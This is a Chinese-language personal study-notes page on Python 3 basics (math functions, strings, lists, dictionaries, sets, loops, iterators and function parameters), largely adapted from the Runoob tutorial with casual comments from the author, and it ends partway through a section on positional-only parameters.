<h1 id="简单数学"><a href="#简单数学" class="headerlink" title="简单数学"></a>简单数学</h1><h2 id="某些函数"><a href="#某些函数" class="headerlink" title="某些函数"></a>某些函数</h2><p>Python 可以使用 ** 操作来进行幂运算：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">ceil(x)	返回数字的上入整数，如math.ceil(<span class="number">4.1</span>) 返回 <span class="number">5</span></span><br><span class="line"></span><br><span class="line">exp(x)	返回e的x次幂(ex),如math.exp(<span class="number">1</span>) 返回<span class="number">2.718281828459045</span></span><br><span class="line"></span><br><span class="line">floor(x)	返回数字的下舍整数，如math.floor(<span class="number">4.9</span>)返回 <span class="number">4</span></span><br><span class="line"></span><br><span class="line">log(x)	如math.log(math.e)返回<span class="number">1.0</span>,math.log(<span class="number">100</span>,<span class="number">10</span>)返回<span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">log10(x)	返回以<span class="number">10</span>为基数的x的对数，如math.log10(<span class="number">100</span>)返回 <span class="number">2.0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">round</span>(x [,n])	</span><br><span class="line">返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。其实准确的说是保留值将保留到离上一位更近的一端。</span><br></pre></td></tr></table></figure>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">choice(seq)	从序列的元素中随机挑选一个元素，比如random.choice(<span class="built_in">range</span>(<span class="number">10</span>))，从<span class="number">0</span>到<span class="number">9</span>中随机挑选一个整数。</span><br><span class="line"></span><br><span class="line">randrange ([start,] stop [,step])	从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 <span class="number">1</span></span><br><span class="line"></span><br><span class="line">random()	随机生成下一个实数，它在[<span class="number">0</span>,<span class="number">1</span>)范围内。</span><br><span class="line"></span><br><span class="line">seed([x])	改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</span><br><span class="line"></span><br><span class="line">shuffle(lst)	将序列的所有元素随机排序</span><br><span class="line"></span><br><span class="line">uniform(x, y)	随机生成下一个实数，它在[x,y]范围内。</span><br><span class="line"></span><br><span class="line">e	数学常量 e，e即自然常数（自然常数）。</span><br><span class="line"></span><br><span class="line">pi	数学常量 pi（圆周率，一般以π来表示）</span><br><span class="line"></span><br><span class="line">degrees(x)	将弧度转换为角度,如degrees(math.pi/<span class="number">2</span>) ， 返回<span class="number">90.0</span></span><br></pre></td></tr></table></figure>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p>
<p>截取时左闭右开</p>
<p>(在行尾时)    续行符</p>
<p>\v    纵向制表符</p>
<p>\t    横向制表符</p>
<p>\yyy    八进制数，y 代表 0~7 的字符，例如：\012 代表换行。</p>
<p>\xyy    十六进制数，以 \x 开头，y 代表的字符，例如：\x0a 代表换行</p>
<p>[ : ]    截取字符串中的一部分，遵循左闭右开原则，str[0:2] 是不包含第 3 个字符的。 我没看之前竟然总结出来了，woc，我太NB了。</p>
<p>in    成员运算符 - 如果字符串中包含给定的字符返回 True</p>
<p>not in    成员运算符 - 如果字符串中不包含给定的字符返回 True</p>
<p>r/R    原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母 r（可以大小写）以外，与普通字符串有着几乎完全相同的语法。<br>print( r’\n’ )<br>print( R’\n’ )</p>
<p>在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。<br>print (“我叫 %s 今年 %d 岁!” % (‘小明’, 10))</p>
<pre><code>  %c     格式化字符及其ASCII码
  %s     格式化字符串
  %d     格式化整数
  %u     格式化无符号整型
  %o     格式化无符号八进制数
  %x     格式化无符号十六进制数
  %X     格式化无符号十六进制数（大写）
  %f     格式化浮点数字，可指定小数点后的精度
  %e     用科学计数法格式化浮点数
  %E     作用同%e，用科学计数法格式化浮点数
  %g     %f和%e的简写
  %G     %f 和 %E 的简写
  %p     用十六进制数格式化变量的地址


*    定义宽度或者小数点精度
-    用做左对齐
+    在正数前面显示加号( + )
&lt;sp&gt;    在正数前面显示空格
#    在八进制数前面显示零(&#39;0&#39;)，在十六进制前面显示&#39;0x&#39;或者&#39;0X&#39;(取决于用的是&#39;x&#39;还是&#39;X&#39;)
0    显示的数字前面填充&#39;0&#39;而不是默认的空格
%    &#39;%%&#39;输出一个单一的&#39;%&#39;
(var)    映射变量(字典参数)
m.n.    m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)
Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能。
</code></pre>
<p>三引号让程序员从引号和特殊字符串的泥潭里面解脱出来，自始至终保持一小块字符串的格式是所谓的WYSIWYG（所见即所得）格式的。</p>
<p>一个典型的用例是，当你需要一块HTML或者SQL时，这时用字符串组合，特殊字符串转义将会非常的繁琐。</p>
<p>f-string 格式化字符串以 f 开头，后面跟着字符串，字符串中的表达式用大括号 {} 包起来，它会将变量或表达式计算后的值替换进去，实例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = <span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;Hello <span class="subst">&#123;name&#125;</span>&#x27;</span>  <span class="comment"># 替换变量</span></span><br><span class="line"><span class="string">&#x27;Hello Runoob&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="number">1</span>+<span class="number">2</span>&#125;</span>&#x27;</span>         <span class="comment"># 使用表达式</span></span><br><span class="line"><span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>w = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;w[<span class="string">&quot;name&quot;</span>]&#125;</span>: <span class="subst">&#123;w[<span class="string">&quot;url&quot;</span>]&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">&#x27;Runoob: www.runoob.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个还挺好玩的</span></span><br></pre></td></tr></table></figure>

<p><strong>在Python3中，所有的字符串都是Unicode字符串。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count(<span class="built_in">str</span>, beg= <span class="number">0</span>,end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回 <span class="built_in">str</span> 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 <span class="built_in">str</span> 出现的次数</span><br><span class="line"></span><br><span class="line"><span class="built_in">bytes</span>.decode(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Python3 中没有 decode 方法，但我们可以使用 <span class="built_in">bytes</span> 对象的 decode() 方法来解码给定的 <span class="built_in">bytes</span> 对象，这个 <span class="built_in">bytes</span> 对象可以由 <span class="built_in">str</span>.encode() 来编码返回。</span><br><span class="line"></span><br><span class="line">encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>,errors=<span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是<span class="string">&#x27;ignore&#x27;</span>或者<span class="string">&#x27;replace&#x27;</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">find(<span class="built_in">str</span>, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">检测 <span class="built_in">str</span> 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">index(<span class="built_in">str</span>, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">跟find()方法一样，只不过如果<span class="built_in">str</span>不在字符串中会报一个异常。</span><br><span class="line"></span><br><span class="line">join(seq)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="built_in">len</span>(string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回字符串长度</span><br><span class="line"></span><br><span class="line">replace(old, new [, <span class="built_in">max</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">把 将字符串中的 old 替换成 new,如果 <span class="built_in">max</span> 指定，则替换不超过 <span class="built_in">max</span> 次。</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">rfind(<span class="built_in">str</span>, beg=<span class="number">0</span>,end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">类似于 find()函数，不过是从右边开始查找.</span><br><span class="line"></span><br><span class="line">split(<span class="built_in">str</span>=<span class="string">&quot;&quot;</span>, num=string.count(<span class="built_in">str</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以 <span class="built_in">str</span> 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+<span class="number">1</span> 个子字符串</span><br></pre></td></tr></table></figure>

<p><strong>字符串函数真他妈多</strong></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>你可以对列表的数据项进行修改或更新，你也可以使用 append() 方法来添加列表项，如下所示：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">删除列表元素 <span class="keyword">del</span> <span class="built_in">list</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]	<span class="literal">True</span>	元素是否存在于列表中</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]: print(x, end=<span class="string">&quot; &quot;</span>)	<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>	迭代</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>(seq) 将元组转换为列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.append(obj) 在列表末尾添加新的对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.count(obj)</span><br><span class="line">统计某个元素在列表中出现的次数</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.extend(seq)</span><br><span class="line">在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.index(obj)</span><br><span class="line">从列表中找出某个值第一个匹配项的索引位置</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.insert(index, obj)</span><br><span class="line">将对象插入列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.pop([index=-<span class="number">1</span>])</span><br><span class="line">移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.remove(obj)</span><br><span class="line">移除列表中某个值的第一个匹配项</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.reverse()</span><br><span class="line">反向列表中元素</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.sort( key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br><span class="line">对原列表进行排序</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.clear()</span><br><span class="line">清空列表</span><br></pre></td></tr></table></figure>
<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p><strong>和map挺像的，和json也挺像，不过这里面好像没有</strong></p>
<p>字典的每个键值 <strong>key=&gt;value</strong> 对用冒号 : 分割，每个对之间用逗号(,)分割，整个字典包括在花括号 {} 中 ,格式如下所示：</p>
<p>d = {key1 : value1, key2 : value2, key3 : value3 }<br>d = {key1 : value1, key2 : value2, key3 : value3 } <strong>大括号</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;Name&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;Name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;Age&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span>               <span class="comment"># 更新 Age</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;菜鸟教程&quot;</span>  <span class="comment"># 添加信息</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;Age&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;School&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;School&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>[<span class="string">&#x27;Name&#x27;</span>] <span class="comment"># 删除键 &#x27;Name&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>.clear()     <span class="comment"># 清空字典</span></span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>         <span class="comment"># 删除字典</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;Age&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dict[&#x27;School&#x27;]: &quot;</span>, <span class="built_in">dict</span>[<span class="string">&#x27;School&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，如下实例：</p>
<p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行，如下实例：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="built_in">dict</span>) **<span class="built_in">len</span>还挺多，重载大法好**</span><br><span class="line">计算字典元素个数，即键的总数。</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>)</span><br><span class="line">输出字典，可以打印的字符串表示。</span><br><span class="line"></span><br><span class="line">radiansdict.clear()</span><br><span class="line">删除字典内所有元素</span><br><span class="line"></span><br><span class="line">key <span class="keyword">in</span> <span class="built_in">dict</span></span><br><span class="line">如果键在字典<span class="built_in">dict</span>里返回true，否则返回false</span><br><span class="line"></span><br><span class="line">radiansdict.keys()</span><br><span class="line">返回一个视图对象</span><br><span class="line"></span><br><span class="line">radiansdict.update(dict2)</span><br><span class="line">把字典dict2的键/值对更新到<span class="built_in">dict</span>里</span><br><span class="line"></span><br><span class="line">pop(key[,default])</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br><span class="line"></span><br><span class="line">popitem()</span><br><span class="line">随机返回并删除字典中的最后一对键和值。</span><br></pre></td></tr></table></figure>
<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p><strong>不多说，去重</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>basket = &#123;<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(basket)                      <span class="comment"># 这里演示的是去重功能</span></span><br><span class="line">&#123;<span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;orange&#x27;</span> <span class="keyword">in</span> basket                 <span class="comment"># 快速判断元素是否在集合内</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;crabgrass&#x27;</span> <span class="keyword">in</span> basket</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 下面展示两个集合间的运算.</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">set</span>(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="built_in">set</span>(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a                                  </span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a - b                              <span class="comment"># 集合a中包含而集合b中不包含的元素</span></span><br><span class="line">&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a | b                              <span class="comment"># 集合a或b中包含的所有元素</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a &amp; b                              <span class="comment"># 集合a和b中都包含了的元素</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a ^ b                              <span class="comment"># 不同时包含于a和b的元素</span></span><br><span class="line">&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>s.add( x )</p>
<p>还有一个方法，也可以添加元素，且参数可以是列表，元组，字典等，语法格式如下：</p>
<p>s.update( x )</p>
<p>x 可以有多个，用逗号分开。 thisset.update([1,4],[5,6])  </p>
<p>s.remove( x ) s.discard( x )</p>
<pre><code>方法    描述
add()    为集合添加元素
clear()    移除集合中的所有元素
copy()    拷贝一个集合
difference()    返回多个集合的差集
difference_update()    移除集合中的元素，该元素在指定的集合也存在。
discard()    删除集合中指定的元素
intersection()    返回集合的交集
intersection_update()    返回集合的交集。
isdisjoint()    判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。
issubset()    判断指定集合是否为该方法参数集合的子集。
issuperset()    判断该方法的参数集合是否为指定集合的子集
pop()    随机移除元素
remove()    移除指定元素
symmetric_difference()    返回两个集合中不重复的元素集合。
symmetric_difference_update()    移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。
union()    返回两个集合的并集
update()    给集合添加元素
</code></pre>
<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>其中代码 <strong>a, b = b, a+b</strong> 的计算方式为先计算右边表达式，然后同时赋值给左边，等价于：</p>
<p>n=b<br>m=a+b<br>a=n<br>b=m</p>
<p>关键字end可以用于将结果输出到同一行，或者在输出的末尾添加不同的字符，实例如下： print(b, end=’,’)</p>
<h1 id="条件结构"><a href="#条件结构" class="headerlink" title="条件结构"></a>条件结构</h1><p>Python 中用 elif 代替了 else if，所以if语句的关键字为：if – elif – else。</p>
<p>在Python中没有switch – case语句。</p>
<h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>在 Python 中没有 do..while 循环。</p>
<p>简单语句组<br>类似if语句的语法，如果你的while循环体中只有一条语句，你可以将该语句与while写在同一行中</p>
<p>for 循环可以遍历任何可迭代对象，如一个列表或者一个字符串。</p>
<pre><code>for &lt;variable&gt; in &lt;sequence&gt;:
    &lt;statements&gt;
else:
    &lt;statements&gt;
</code></pre>
<p>如果你需要遍历数字序列，可以使用内置range()函数。它会生成数列，例如:</p>
<pre><code>&gt;&gt;&gt;for i in range(5,9) :
    print(i)

    
5
6
7
8
</code></pre>
<p>也可以使range以指定数字开始并指定不同的增量(甚至可以是负数，有时这也叫做’步长’): <strong>左闭右开</strong></p>
<pre><code>&gt;&gt;&gt;for i in range(0, 10, 3) :
    print(i)

    
0
3
6
9
</code></pre>
<p>还可以使用range()函数来创建一个列表：list(range(5)) [0, 1, 2, 3, 4]</p>
<p>break 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。</p>
<p>continue 语句被用来告诉 Python 跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>
<p>Python pass是空语句，是为了保持程序结构的完整性。 <strong>挺花哨</strong></p>
<h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>迭代器是一个可以记住遍历的位置的对象。</p>
<p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p>
<p>迭代器有两个基本的方法：iter() 和 next()。</p>
<p>字符串，列表或元组对象都可用于创建迭代器：</p>
<pre><code>&gt;&gt;&gt; list=[1,2,3,4]
&gt;&gt;&gt; it = iter(list)    # 创建迭代器对象
&gt;&gt;&gt; print (next(it))   # 输出迭代器的下一个元素
1
&gt;&gt;&gt; print (next(it))
2
&gt;&gt;&gt;
</code></pre>
<p>迭代器对象可以使用常规for语句进行遍历： for x in it:</p>
<p>Python 的构造函数为 <strong>init</strong>()</p>
<p><strong>iter</strong>() 方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 <strong>next</strong>() 方法并通过 StopIteration 异常标识迭代的完成。</p>
<p><strong>next</strong>() 方法（Python 2 里是 next()）会返回下一个迭代器对象。</p>
<p>StopIteration<br>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 <strong>next</strong>() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。</p>
<p><strong>生成器暂时不写了，感觉用不到</strong></p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><em>没见过：</em></p>
<h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>
<ol>
<li><p>不可变类型：变量赋值 a=5 后再赋值 a=10，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变 a 的值，相当于新生成了 a。</p>
</li>
<li><p>可变类型：变量赋值 la=[1,2,3,4] 后再赋值 la[2]=5 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</p>
</li>
</ol>
<p><strong>一切皆对象</strong></p>
<p>参数传递：</p>
<ul>
<li><p>不可变类型：类似 C++ 的值传递，如整数、字符串、元组。</p>
</li>
<li><p>可变类型：类似 C++ 的引用传递，如 列表，字典。</p>
</li>
</ul>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
<p>以下实例在函数 printme() 调用时使用参数名：</p>
<pre><code>printinfo( age=50, name=&quot;runoob&quot; ) #就是调用函数的时候加上名
</code></pre>
<h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p>
<pre><code>def printinfo( arg1, *vartuple ):
&quot;打印任何传入的参数&quot;
print (&quot;输出: &quot;)
print (arg1)
print (vartuple)

# 调用printinfo 函数
printinfo( 70, 60, 50 )

输出: 
70
(60, 50)
</code></pre>
<p>加了两个星号 ** 的参数会以字典的形式导入</p>
<pre><code>def printinfo( arg1, **vardict ):
&quot;打印任何传入的参数&quot;
print (&quot;输出: &quot;)
print (arg1)
print (vardict)

# 调用printinfo 函数
printinfo(1, a=2,b=3)
输出: 
1
&#123;&#39;a&#39;: 2, &#39;b&#39;: 3&#125;
</code></pre>
<p>如果单独出现星号 * 后的参数必须用关键字传入。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> a+b+c</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><pre><code>lambda [arg1 [,arg2,.....argn]]:expression
</code></pre>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">20</span>, <span class="number">20</span> ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">相加后的值为 :  <span class="number">30</span></span><br><span class="line">相加后的值为 :  <span class="number">40</span></span><br></pre></td></tr></table></figure>

<h2 id="强制位置参数"><a href="#强制位置参数" class="headerlink" title="强制位置参数"></a>强制位置参数</h2><p><em>新特性</em></p>
<p>Python3.8 新增了一个函数形参语法 / 用来指明函数形参必须使用指定位置参数，不能使用关键字参数的形式。</p>
<p>在以下的例子中，形参 a 和 b 必须使用指定位置参数，c 或 d 可以是位置形参或关键字形参，而 e 和 f 要求为关键字形参:</p>
